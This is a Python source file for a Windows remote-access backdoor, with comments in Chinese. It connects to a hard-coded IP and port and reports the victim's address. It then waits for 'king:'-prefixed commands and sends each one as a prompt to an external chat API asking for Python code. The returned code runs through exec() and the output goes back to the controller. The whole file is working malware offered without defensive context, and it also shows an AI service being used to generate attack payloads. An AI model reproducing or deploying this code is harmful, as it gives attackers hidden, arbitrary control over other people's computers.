import os
import time
import winreg
import socket
import threading
import requests
import win32api,win32con
import win32clipboard
import sys
import ctypes
import pyautogui
import subprocess
import platform
import webbrowser
import shutil
import cv2
import numpy as np
import string
import easygui
import threading
import psutil
ip = "192.168.3.67"
port = 6666

def ask(content):
    def ask_question(content):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
        }
        data = {
            'content': content,
        }
        response = requests.post('https://api.texttools.cn/api/chat/stream', headers=headers, json=data, stream=True)
        response.encoding = "utf-8"
        return response.text
    try:
        nr = ask_question('请你用python生成一个' + content + '的代码，并将返回的结果保存在变量a中')
        nr = nr.split('```')
        jl = ''
        for i in nr[1].split('\n'):
            if i == 'python':
                continue
            else:
                jl += i + '\n'
        return jl+'send(a)'
    except Exception as a:
        return 'send(\'error\'+'+str(a)+')'
def getnwip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    a = s.getsockname()[0]
    s.close()
    return a

def getip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    a = s.getsockname()[0]
    s.close()
    return a


gtip = getip()
def zhu():
    ip_port = (ip,port)

    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sk.connect(ip_port)

    def send(nr):
        nr = gtip+':'+str(nr)
        sk.send(nr.encode(encoding='utf-8'))

    send(' is in!!!')
    while True:
        date = sk.recv(8192)  # 接受信息
        nr = date.decode('utf-8')
        if nr[:5] == 'king:':
            nr = nr[5:]
            if nr[:3] == 'ip:':
                if nr[3:].split(':')[0] != gtip:
                    continue
                else:
                    nr = ':'.join(nr[3:].split(':')[1:])
            if ''.join(nr.split()) == '':
                continue
            else:
                try:
                    send('正在处理')
                    jl = ask(nr)
                    print(jl)
                    exec(jl)
                except Exception as a:
                    send(a)

    #sk.close#结束连接
zhu()